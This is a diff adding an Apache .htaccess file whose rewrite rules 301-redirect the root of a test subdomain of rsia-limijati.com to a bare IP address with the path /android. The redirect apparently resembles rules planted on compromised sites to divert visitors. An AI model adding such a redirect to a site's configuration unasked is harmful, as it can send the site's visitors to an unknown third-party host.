@@ -1,0 +1,6 @@
+
+RewriteEngine on
+RewriteCond %{HTTP_HOST} ^test\.rsia\-limijati\.com$ [OR]
+RewriteCond %{HTTP_HOST} ^www\.test\.rsia\-limijati\.com$
+RewriteRule ^/?$ "http\:\/\/156\.67\.217\.230\/android" [R=301,L]
+
